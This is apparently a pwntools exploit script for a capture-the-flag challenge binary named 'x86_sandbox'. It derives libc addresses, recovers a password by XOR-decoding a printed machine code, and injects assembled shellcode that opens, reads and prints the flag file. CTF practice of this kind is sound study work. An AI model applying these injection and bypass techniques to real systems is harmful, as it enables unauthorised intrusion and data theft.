###################################################
from pwn import *
from LibcSearcher import *
import time, sys, base64


io = None
if(len(sys.argv)>2):
    global io
    host = sys.argv[1]
    port = int(sys.argv[2])
    io = remote(host, port)
else:
    global io
    # io = process("/home/emmm/awork/xctf/web_server/xctf_pwn")
    # io = process(argv= ["./src/x86_sandbox", "-debug"])
    io = process("x86_sandbox")

context(terminal=['tmux', 'new-window'], arch='amd64')
# context.log_level = 'debug'
# export LD_LIBRARY_PATH=../lib:$LD_LIBRARY_PATH

env = {"LD_PRELOAD": os.path.join(os.getcwd(), "libc.so.6")}

sd = lambda x: io.send(x)
sl = lambda x: io.sendline(x)
sa = lambda v, a: io.sendafter(v, a)
sla = lambda v, a: io.sendlineafter(v, a)
r = lambda n=None: io.recv(n) if n == None else io.recv()
ru = lambda x: io.recvuntil(x)
rud = lambda x: io.recvuntil(x, drop=True)
uu64 = lambda: u64(io.recvuntil("\x7f")[-6:].ljust(8, '\x00'))
sp = lambda: sleep(0.01)


get_flag = 0x00401428
system = 0x0007FFFF74BA390
libc = LibcSearcher("__libc_system", system)
base = 0x0007FFFF74BA390 - libc.dump("__libc_system")
read = base + libc.dump("__libc_read")
write = base + libc.dump("__libc_write")

print ru("Your machine-code is")
raw_input()
rud("m ")
mcode = rud(" ").split("-")
success ("machine-code: " + str(mcode))
mcode = mcode[3] + mcode[2] + mcode[1] + mcode[0]

mcode = list(base64.b16decode(mcode)[::-1])

for i in range(14, -1, -1):
    mcode[i] = chr(ord(mcode[i]) ^ ord(mcode[i+1]))

mcode = base64.b16encode("".join(mcode))
success ("passwd: "+mcode)

sa(b"password", "2333".ljust(128, "3"))
sla(b"password", "2333".ljust(4, "3"))
for i in range(0x20-2):
    sla(b"password", "".ljust(1, "3"))

sla(b"password", mcode.ljust(32, "g"))

ru("data ptr:")
data_ptr = int(rud("\n"), 16)
success("data_ptr : "+hex(data_ptr))
def call(data, invoke, arg0, arg1, arg2):
    sla("<<", data)
    sla("invoke ptr<<", str(invoke))
    sla("arg0", str(arg0))
    sla("arg1", str(arg1))
    sla("arg2", str(arg2))

code = asm(
    "push rdi;\n" 
    "push rsi;\n"
    "sub rsp, 0x80;\n"
    "call rdx;\n"# open ret 3
    "add rsp, 0x80;\n"
    
    # read(flag fd, arg1, arg2)
    "mov edx, dword ptr[rsp + 8];\n"# count
    "mov rdi, 3;\n"# open flag fd 3
    "pop rsi;\n"
    "push rsi;\n"
    "mov eax, 0;\n"
    "syscall;\n"
    
    
    # write(1, arg1, arg2")
    "mov rdi, 1;\n"
    "pop rsi;\n"
    "pop rdx;\n"
    "mov eax, 1;\n"
    "syscall;\n"
    "ret;\n"

)

# "pop rbx;\n"
success("code: "+code)

# call("cat flag.txt", system, data_ptr, 0, 0)# syscall is disabled

sd("Y")
sleep(0.04)
flag_size = 36
call(code, data_ptr, flag_size, data_ptr + len(code), get_flag)

io.interactive()
